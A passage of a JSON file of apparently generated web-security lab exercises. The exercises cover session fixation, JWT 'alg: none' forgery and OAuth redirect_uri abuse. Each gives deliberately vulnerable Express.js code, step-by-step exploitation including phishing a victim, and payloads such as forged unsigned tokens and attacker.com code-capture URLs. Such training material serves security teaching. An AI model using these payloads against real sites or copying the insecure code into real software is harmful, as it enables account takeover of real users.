        "Lab Description": "The login mechanism of this web application accepts an optional session token via a query parameter. This token is reused after login without being regenerated. The application stores session tokens in cookies without validating their origin. To solve: Fixate a session token prior to login and hijack the session after authentication.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use OWASP ZAP to spider the application and discover the login endpoint accepting ?token=.",
          "2. Send a GET /login?token=attacker-token request to initialize the fixation token.",
          "3. Share the crafted URL with the victim or simulate a victim login using Burp Suite by modifying the login request to include token=attacker-token.",
          "4. Observe that upon successful login, the same attacker-token is stored in a session cookie without regeneration.",
          "5. Replay the session by sending the attacker-token in the cookie header to access the authenticated user's /dashboard."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; app.get('/login', (req, res) => { const token = req.query.token || Math.random().toString(36).substring(2); res.cookie('session', token); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'secure123') { const token = req.cookies.session; sessions[token] = username; return res.redirect('/dashboard'); } res.send('Invalid login'); }); app.get('/dashboard', (req, res) => { const token = req.cookies.session; const user = sessions[token]; if (user) return res.send(`Welcome ${user}`); res.send('Unauthorized'); }); app.listen(4000);",
        "payloads": [
          "GET /login?token=attack123",
          "Set-Cookie: session=attack123",
          "POST /login with token set in cookie",
          "GET /dashboard with session=attack123"
        ]
      },
      {
        "Lab scenario": "JWT tampering via alg=none in token verification middleware",
        "Lab Description": "The backend verifies JWTs but does not enforce strict algorithm checks. It accepts tokens signed with 'none', allowing an attacker to forge tokens without a secret key. To solve: Forge a JWT for the admin user using alg=none and gain access to the protected /admin area.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Postman to obtain a legitimate JWT by logging in as a regular user and inspecting the Authorization header.",
          "2. Decode the JWT using jwt.io or a Burp Extension, and note the structure.",
          "3. Create a new token manually where the header includes 'alg':'none' and payload includes 'username':'admin'.",
          "4. Remove the signature section of the JWT and set the forged token in the Authorization: Bearer header.",
          "5. Send a GET /admin request using the crafted JWT and verify access is granted without a valid signature."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'topsecret'; app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username === 'admin') return res.send('Welcome admin'); } else { try { const verified = jwt.verify(token, secret); if (verified.username === 'admin') return res.send('Welcome admin'); } catch (e) { return res.status(403).send('Invalid token'); } } res.status(403).send('Access denied'); }); app.listen(4000);",
        "payloads": [
          "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
          "Payload: {\"username\":\"admin\"}",
          "JWT (base64): header.payload.",
          "Authorization: Bearer [forged_token]"
        ]
      },
      {
        "Lab scenario": "OAuth open redirect via manipulated redirect_uri parameter",
        "Lab Description": "The OAuth 2.0 implementation does not validate redirect_uri strictly, allowing an attacker to redirect authorization codes to their own domain. To solve: Manipulate the redirect_uri parameter to intercept an OAuth code and gain access as the victim.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to intercept the initial OAuth login flow and identify the redirect_uri parameter.",
          "2. Modify the redirect_uri to an attacker-controlled domain or HTTP server using ngrok or localtunnel.",
          "3. Send the crafted OAuth login URL to the victim, who will authenticate and unknowingly send the code to your server.",
          "4. Extract the authorization code from the request to your server logs or listener.",
          "5. Exchange the stolen code with a POST /token call to get the victim’s access_token and call /me to confirm user impersonation."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { redirect_uri } = req.query; const code = 'temp-auth-code';  res.redirect(`${redirect_uri}?code=${code}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'temp-auth-code') return res.json({ access_token: 'user-token' }); res.status(400).send('Invalid code'); }); app.get('/me', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'user-token') return res.send('Hello Carlos'); res.status(403).send('Forbidden'); }); app.listen(4000);",
        "payloads": [
          "https://target.com/oauth/authorize?client_id=abc&redirect_uri=http://attacker.com/callback",
          "GET http://attacker.com/callback?code=temp-auth-code",
          "POST /oauth/token with code=temp-auth-code",
          "GET /me with Authorization: Bearer user-token"
        ]
      },
      {
        "Lab scenario": "Session fixation in login workflow via URL parameter",
        "Lab Description": "The application fails to regenerate session tokens upon successful login. Instead, it allows user-supplied session IDs via the URL. An attacker can predefine a session ID, share it with a victim, and later take over the session post-login. The application reflects session identifiers in the URL without validation. To solve: hijack Carlos's session by forcing him to authenticate using an attacker-defined session ID and access his account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1.Using Burp Suite, intercept a GET /login?session=XYZ123 request and observe the server accepts and sets this session token.",
          "2.Confirm the vulnerability by logging in as yourself using a predefined session ID and checking if the session persists post-login.",
          "3.Craft a phishing link like https://vulnerable.site/login?session=attackerToken and send it to Carlos.",
          "4.Once Carlos logs in using the malicious link, reuse the session ID 'attackerToken' to access his session.",
          "5.Navigate to /my-account with the fixed session ID and confirm the takeover by viewing Carlos’s details."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const app = express(); app.use(cookieParser()); app.use(session({ secret: 'keyboardcat', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/login', (req, res) => { if (req.query.session) { req.session.id = req.query.session; } res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\"><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; res.redirect('/my-account'); } else { res.status(403).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send('Account page of ' + req.session.user); else res.status(403).send('Not logged in'); }); app.listen(3000);",
        "payloads": [
          "https://vulnerable.site/login?session=attackerToken",
          "Set-Cookie: session=attackerToken",
          "GET /my-account with session=attackerToken"
        ]
      },
      {
        "Lab scenario": "JWT token tampering via algorithm confusion in Authorization header",
        "Lab Description": "The application uses JWTs for session authentication, but fails to enforce signature verification when the `alg` field is set to 'none'. It accepts unsigned tokens if the `alg` header is manipulated. The application trusts decoded claims blindly without validating token integrity. To solve: craft a JWT with 'none' algorithm and escalate privileges to impersonate Carlos.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1.Capture a valid JWT after login using Burp Suite. Note the `alg` field in the header is `HS256`.",
          "2.Decode the JWT using jwt.io or Burp decoder. Modify the header to {\"alg\":\"none\"} and payload to {\"username\":\"carlos\"}.",
          "3.Remove the JWT signature section entirely and re-encode the header and payload using Base64.",
          "4.Use Burp Suite or Postman to resend a request with the tampered token in the Authorization: Bearer header.",
          "5.Verify that you have accessed Carlos's session by confirming the contents of /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'carlos123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username }, 'secretkey', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('No token'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token); res.send('Account details for ' + decoded.username); }); app.listen(4000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "{\"alg\":\"none\"}"
        ]
      },
      {
        "Lab scenario": "OAuth open redirect in redirect_uri parameter allows account takeover",
        "Lab Description": "The OAuth flow implemented in this application fails to validate the `redirect_uri` parameter strictly. An attacker can manipulate this parameter to point to a domain they control and steal the authorization code. The application exchanges this code for tokens without verifying the origin. To solve: intercept Carlos's authorization code and use it to access his account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1.Open Burp and visit /auth?client_id=trusted-app&redirect_uri=https://malicious.site&response_type=code.",
          "2.Note that the server accepts arbitrary `redirect_uri` values as long as they are syntactically valid.",
          "3.Send a phishing link to Carlos using the above OAuth URL. Once Carlos logs in, capture the redirected request on https://malicious.site?code=XYZ123.",
          "4.Exchange the stolen code using Postman: POST /token with body { code: XYZ123, client_id: trusted-app, grant_type: authorization_code }.",
          "5.Use the received access_token to call /my-account as Carlos and verify the account access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; const code = 'authCode123'; res.redirect(redirect_uri + '?code=' + code); }); app.post('/token', express.urlencoded({ extended: true }), (req, res) => { const { code, client_id } = req.body; if (code === 'authCode123' && client_id === 'trusted-app') { res.json({ access_token: 'carlosToken' }); } else { res.status(400).send('Invalid request'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization; if (token === 'Bearer carlosToken') { res.send('Sensitive data of Carlos'); } else { res.status(403).send('Unauthorized'); } }); app.listen(5000);",
        "payloads": [
          "https://vulnerable.site/auth?client_id=trusted-app&redirect_uri=https://malicious.site&response_type=code",
          "POST /token with code=authCode123",
          "Authorization: Bearer carlosToken"
        ]
      },
      {
        "Lab scenario": "JWT signature bypass via 'none' algorithm in API authorization",
        "Lab Description": "The application uses JSON Web Tokens (JWT) to authorize access to its internal API. However, it accepts tokens with the 'alg' field set to 'none', bypassing signature verification. The application trusts any JWT with a valid payload and does not validate its signature. To solve: Forge a JWT that impersonates the user 'carlos' and access the /api/account endpoint to retrieve their account information.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a legitimate request to /api/account and capture the JWT from the Authorization header.",
          "2. Decode the JWT using jwt.io or Burp Decoder. Observe the 'alg' header and payload structure.",
          "3. Modify the header to {\"alg\":\"none\",\"typ\":\"JWT\"} and the payload to {\"username\":\"carlos\"}. Remove the signature part completely.",
          "4. Base64-encode the modified header and payload. Rebuild the JWT as [header].[payload].",
          "5. Use Postman to send a GET request to /api/account with the forged JWT in the Authorization header. Confirm access to Carlos's account details."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/api/account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username === 'carlos') { return res.send('Account details for carlos'); } } else { jwt.verify(token, 'secret', (err, user) => { if (err) return res.status(403).send('Invalid token'); if (user.username === 'carlos') return res.send('Account details for carlos'); }); } } catch (e) { res.status(400).send('Invalid token format'); } }); app.listen(3000, () => console.log('JWT None Algorithm Lab running on http://localhost:3000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
        ]
      },
      {
        "Lab scenario": "OAuth implicit flow misconfiguration",
        "Lab Description": "This lab integrates with an OAuth 2.0 provider using the implicit grant flow. However, it fails to validate the access token or issuer properly. The access_token is directly used as an authentication mechanism without validation. To solve: Obtain a forged access token for the victim 'carlos' and use it to log in via the /auth/callback endpoint.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Open Burp Suite and intercept the OAuth login process. Capture the URL redirect containing access_token in the fragment.",
          "2. Notice the token format is a simple Base64 string. Decode it to observe the structure: {\"sub\":\"username\"}.",
          "3. Modify the payload to {\"sub\":\"carlos\"} and base64-encode it. Reconstruct a fake access token.",
          "4. Paste the forged redirect URL into the browser: /auth/callback#access_token=[forged_token].",
          "5. If successful, the server accepts the token and logs you in as Carlos. Access the profile page to confirm."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth/callback', (req, res) => { const tokenFragment = req.url.split('#access_token=')[1]; if (!tokenFragment) return res.status(400).send('Missing token'); const payload = JSON.parse(Buffer.from(tokenFragment, 'base64').toString()); if (payload.sub === 'carlos') { return res.send('Logged in as Carlos'); } res.status(401).send('Access denied'); }); app.listen(5000, () => console.log('OAuth Implicit Flow Lab running on http://localhost:5000'));",
        "payloads": [
          "eyJzdWIiOiJjYXJsb3MifQ==",
          "#access_token=eyJzdWIiOiJjYXJsb3MifQ=="
        ]
      },
      {
        "Lab scenario": "OAuth redirect_uri manipulation leading to account takeover",
        "Lab Description": "The application uses OAuth to delegate authentication to a third-party provider but improperly validates the redirect_uri parameter. The application fails to strictly match or validate trusted domains. To solve: hijack the OAuth flow and gain access to Carlos’s account using a crafted redirect_uri.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1.Use OWASP ZAP or Burp Suite to intercept the OAuth authorization request.",
          "2.Observe the redirect_uri parameter in the request to the authorization endpoint. Modify it to a controlled open redirect domain (e.g., https://attacker.com/redirect?target=https://lab-id.web-security-academy.net/oauth-callback).",
          "3.Register a phishing endpoint on attacker.com that captures the OAuth code query parameter.",
          "4.Visit the authorization URL in your browser to trigger the flow and intercept the OAuth code on attacker.com.",
          "5.Replay the code to the vulnerable /oauth-callback endpoint with the victim's session context.",
          "6.Access Carlos's My Account page to confirm the takeover."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); const session = {}; app.get('/login', (req, res) => { const oauthUrl = `https://oauth-provider.com/auth?client_id=abc123&redirect_uri=${req.query.redirect_uri}&response_type=code`; res.redirect(oauthUrl); }); app.get('/oauth-callback', async (req, res) => { const { code } = req.query; try { const tokenResponse = await axios.post('https://oauth-provider.com/token', { code }); const userInfo = await axios.get('https://oauth-provider.com/userinfo', { headers: { Authorization: `Bearer ${tokenResponse.data.access_token}` } }); session[userInfo.data.username] = true; res.redirect('/my-account'); } catch (err) { res.status(500).send('OAuth Error'); } }); app.get('/my-account', (req, res) => { res.send('Sensitive account data for logged-in user'); }); app.listen(3000);",
        "payloads": [
          "https://attacker.com/redirect?target=https://victim-lab.com/oauth-callback",
          "https://attacker.com/capture?next=https://victim-lab.com/oauth-callback"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion vulnerability",
        "Lab Description": "The application uses JWTs for session handling and accepts unsigned tokens due to improper algorithm enforcement. The backend uses a vulnerable JWT library that accepts 'alg':'none'. To solve: forge an unsigned JWT to impersonate Carlos and access his account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1.Use Postman or jwt.io debugger to inspect a valid JWT obtained after login.",
          "2.Note the header includes 'alg':'HS256'. Modify it to 'alg':'none' and remove the signature.",
          "3.Modify the payload section of the JWT to set the username to carlos.",
          "4.Base64-encode the modified header and payload, omitting the signature.",
          "5.Replace the JWT in your session cookie with the tampered token using Burp Suite.",
          "6.Visit /my-account and confirm access as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecret'; app.use(require('cookie-parser')()); app.get('/login', (req, res) => { const { username } = req.query; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.cookie('token', token); res.send('Logged in'); }); app.get('/my-account', (req, res) => { try { const decoded = jwt.verify(req.cookies.token, secret, { algorithms: ['HS256', 'none'] }); res.send(`Welcome ${decoded.username}`); } catch { res.status(401).send('Unauthorized'); } }); app.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "Session fixation using insecure token handling",
        "Lab Description": "The application allows setting the session ID via URL query parameter. The server does not invalidate or regenerate the session after login. To solve: fix a session ID before login and trick Carlos into using it, then hijack his session post-login.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1.Generate a known session ID (e.g., abc123) and visit the app using ?session=abc123 in the URL.",
          "2.Capture and store the Set-Cookie header from the response using Burp Suite.",
          "3.Trick Carlos into visiting the link with the same session ID (e.g., using social engineering or phishing email).",
          "4.After Carlos logs in, revisit the site with the same session ID to hijack his authenticated session.",
          "5.Navigate to /my-account to confirm access as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.use((req, res, next) => { let sid = req.query.session || req.cookies.session; if (!sid) sid = Math.random().toString(36).substr(2); sessions[sid] = sessions[sid] || {}; res.cookie('session', sid); req.session = sessions[sid]; next(); }); app.get('/login', (req, res) => { const { username } = req.query; req.session.user = username; res.send('Logged in'); }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Sensitive account data for Carlos'); else res.send('Not authorized'); }); app.listen(3000);",
        "payloads": [
          "http://victim-lab.com/?session=abc123",
          "http://victim-lab.com/login?username=carlos&session=abc123"
        ]
      },
      {
        "Lab scenario": "JWT none algorithm manipulation in API auth header",
        "Lab Description": "The application uses a JWT token for authentication, accepting the token from an Authorization: Bearer header. The backend insecurely supports the 'none' algorithm in JWT validation, allowing the signature to be bypassed. To solve: forge a token that grants admin access without knowing the original signing key.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept login request with Burp Suite and capture JWT token in Authorization header",
          "Copy the JWT to jwt.io and observe it uses HS256 algorithm with predictable payload structure",
          "Modify alg to 'none', remove signature, and set payload to {\"username\": \"admin\", \"role\": \"admin\"}",
          "Use Postman to send a GET request to /admin-dashboard with modified JWT in Authorization header",
          "Confirm access to admin dashboard and note server response with admin session token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'admin', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); const token = jwt.sign({ username, role: 'user' }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') return res.send('Welcome, admin!'); } else { const verified = jwt.verify(token, 'secret'); if (verified.role === 'admin') return res.send('Welcome, admin!'); } res.status(403).send('Forbidden'); } catch { res.status(403).send('Invalid token'); } }); app.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "OAuth implicit grant token leakage via Referer",
        "Lab Description": "The application implements an OAuth 2.0 implicit grant flow that directly exposes access tokens in the URL fragment. When third-party JavaScript is loaded on redirect URIs, these tokens are leaked via Referer headers. To solve: extract an access token belonging to Carlos using Referer header leakage and reuse it to access protected resources.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept OAuth redirection to /oauth-callback with access_token in URL fragment",
          "Note that third-party script from evil.net is embedded in /oauth-callback",
          "Observe that the Referer header in the request to evil.net leaks access_token",
          "Visit the OAuth flow link again in browser with Intercept off to trigger Referer leak",
          "Send the leaked access token in Authorization header via Postman to GET /my-account"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'abc123token' }; app.get('/oauth-callback', (req, res) => { const html = `<html><head><script src=\"https://evil.net/track.js\"></script></head><body>OAuth Complete</body></html>`; res.send(html); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer abc123token') res.send('Carlos account page'); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
        "payloads": [
          "GET https://evil.net/track.js Referer: https://target.com/oauth-callback#access_token=abc123token",
          "Authorization: Bearer abc123token"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session tokens in login response",
        "Lab Description": "The application sets a session cookie in a GET /set-session endpoint before login. The token is reused after successful login without regeneration. An attacker can fix a session ID and force the victim to authenticate within it. To solve: fix a session ID and log in as Carlos within that session to hijack the login state.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to send GET /set-session and observe that a predictable session cookie is returned",
          "Send the fixed session cookie link to the victim using social engineering",
          "Once victim logs in, the attacker reuses the same cookie to access /my-account",
          "Send GET request to /my-account using the fixed cookie to hijack the session",
          "Confirm access to Carlos’s account via session reuse"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/set-session', (req, res) => { const sessionId = 'fixed-session-id'; res.cookie('session', sessionId); sessions[sessionId] = { username: null }; res.send('Session set'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sessionId = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (user && sessions[sessionId]) { sessions[sessionId].username = username; res.send('Logged in'); } else { res.status(403).send('Login failed'); } }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.session]; if (session && session.username === 'carlos') res.send('Carlos account'); else res.status(401).send('Access denied'); }); app.listen(5000);",
        "payloads": [
          "GET /set-session => Cookie: session=fixed-session-id",
          "POST /login => Cookie: session=fixed-session-id, Body: username=carlos&password=pass123",
          "GET /my-account => Cookie: session=fixed-session-id"
        ]
      },
      {
        "Lab scenario": "Session fixation vulnerability in login flow",
        "Lab Description": "The login mechanism fails to assign a new session token after authentication. The application reuses the session token set prior to login. To solve: fixate a session for the victim user, log them in using social engineering or automation, then access their account.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
          "1. Intercept the GET /login request using Burp Suite to retrieve a valid session cookie before authentication.",
          "2. Send the session cookie to the victim using a phishing link that embeds the session value in a URL (e.g., http://vulnerable-app.com/login?session=abcd1234).",
          "3. Wait for the victim to log in, which causes the reused session to become authenticated.",
          "4. Reuse the same session cookie in your browser and navigate to /my-account.",
          "5. Confirm successful session hijacking and data access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'insecuresecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'securepass' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\" /><input name=\"password\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.authenticated = true; req.session.username = username; res.redirect('/my-account'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.authenticated) res.send('Welcome, ' + req.session.username); else res.status(401).send('Please log in.'); }); app.listen(3000, () => console.log('Session Fixation Lab running on port 3000'));",
        "payloads": [
          "http://vulnerable-app.com/login?session=abcd1234",
          "Set-Cookie: connect.sid=abcd1234; Path=/; HttpOnly",
          "Reuse stolen cookie: abcd1234 in victim’s browser"
        ]
      },
      {
        "Lab scenario": "JWT tampering via algorithm confusion vulnerability in token validation",
        "Lab Description": "The server accepts and trusts JWTs with the `alg` header set to `none`, allowing unsigned tokens to be accepted. The application trusts the payload without validating its integrity. To solve: craft a forged JWT token impersonating Carlos and use it to access /my-account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Capture a legitimate JWT token from an authenticated request using OWASP ZAP or Burp Suite.",
          "2. Decode the JWT token using jwt.io or a script and analyze the payload and header.",
          "3. Modify the `alg` field to `none`, set `username` to `carlos`, and remove the signature part.",
          "4. Replace the JWT token in the Authorization header with the forged one.",
          "5. Send the request to /my-account and confirm access to Carlos’s account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'jwtpass' }]; app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; if (!token) return res.sendStatus(401); const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { res.send('Welcome, ' + payload.payload.username); } else { try { const verified = jwt.verify(token, 'jwt-secret'); res.send('Welcome, ' + verified.username); } catch (e) { res.sendStatus(403); } } }); app.listen(4000, () => console.log('JWT Tampering Lab running on port 4000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "Authorization: Bearer <forged-token>",
          "{\"alg\":\"none\"} + {\"username\":\"carlos\"}"
        ]
      },
      {
        "Lab scenario": "OAuth token manipulation in third-party login integration",
        "Lab Description": "The application integrates with an OAuth provider but does not properly validate the `access_token` or `id_token` audience and issuer. It only parses the token payload to extract the email. To solve: forge a valid-looking token for Carlos with a fake OAuth issuer and access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Postman to observe the OAuth login flow and inspect the structure of a valid `id_token` (JWT).",
          "2. Craft a fake token using jwt.io with `email: carlos@example.com` and a spoofed `iss` (issuer).",
          "3. Set `alg` to `HS256` and sign it with a self-chosen key, e.g., 'fake-oauth-key'.",
          "4. Intercept the OAuth callback request in Burp and replace the real token with the forged one.",
          "5. Replay the modified request to the OAuth callback endpoint and confirm login as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/oauth/callback', (req, res) => { const { id_token } = req.body; try { const payload = jwt.decode(id_token);  const email = payload.email; if (email === 'carlos@example.com') { res.send('Welcome back, Carlos!'); } else { res.send('Logged in as ' + email); } } catch (e) { res.status(400).send('Invalid token'); } }); app.listen(5000, () => console.log('OAuth Token Manipulation Lab running on port 5000'));",
        "payloads": [
          "{\"alg\":\"HS256\",\"typ\":\"JWT\"}.eyJlbWFpbCI6ImNhcmxvc0BleGFtcGxlLmNvbSIsImlzcyI6Imh0dHBzOi8vZmFrZW9hdXRoLmNvbS8ifQ==.<HMAC-signature>",
          "id_token=forged.jwt.token",
          "Header: {\"alg\":\"HS256\"} + Payload: {\"email\":\"carlos@example.com\"} + Signed with key 'fake-oauth-key'"
        ]
      },
      {
        "Lab scenario": "Session fixation in login flow",
        "Lab Description": "This lab’s login mechanism is vulnerable to session fixation. The application does not assign a new session identifier upon successful login. As a result, an attacker can set a session ID before login and reuse it. To solve the lab, gain access to Carlos's account using a pre-established session.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a GET request to /login and capture the Set-Cookie header with the session ID.",
          "Send a crafted phishing link with this session ID embedded in the URL as a cookie to the victim.",
          "Once the victim logs in, re-use the same session ID by setting it manually in your browser using the EditThisCookie extension or Burp.",
          "Navigate to /my-account with the fixed session cookie still valid.",
          "Verify account takeover by viewing Carlos's account details."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: '123456' }]; app.get('/login', (req, res) => { if (!req.cookies.sessionid) res.cookie('sessionid', Math.random().toString(36).substring(7)); res.send('<form method=\"POST\">...</form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { console.log('Session ID retained:', req.cookies.sessionid); res.redirect('/my-account'); } else res.send('Invalid login'); }); app.get('/my-account', (req, res) => res.send('Carlos account page')); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on port ${PORT}`));",
        "payloads": [
          "sessionid=attackerSession123",
          "Cookie: sessionid=attackerSession123",
          "Phishing URL: http://target.com/login; cookie=sessionid=attackerSession123"
        ]
      },
      {
        "Lab scenario": "JWT tampering using 'none' algorithm",
        "Lab Description": "The application uses JWT for authentication but fails to validate the token signature algorithm correctly. If the algorithm is changed to 'none', the server accepts the token as valid without verification. To solve the lab, forge a valid JWT for Carlos and access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept the JWT token issued after login using Burp or Postman.",
          "Copy the token and decode it using jwt.io or a Python script.",
          "Modify the payload to change the username to 'carlos'. In the header, set the alg value to 'none'.",
          "Remove the signature section of the token entirely.",
          "Send the forged token in the Authorization header and request /my-account.",
          "Verify access by reading Carlos’s account page."
        ],
        "Vulnerability name": "Authentication",
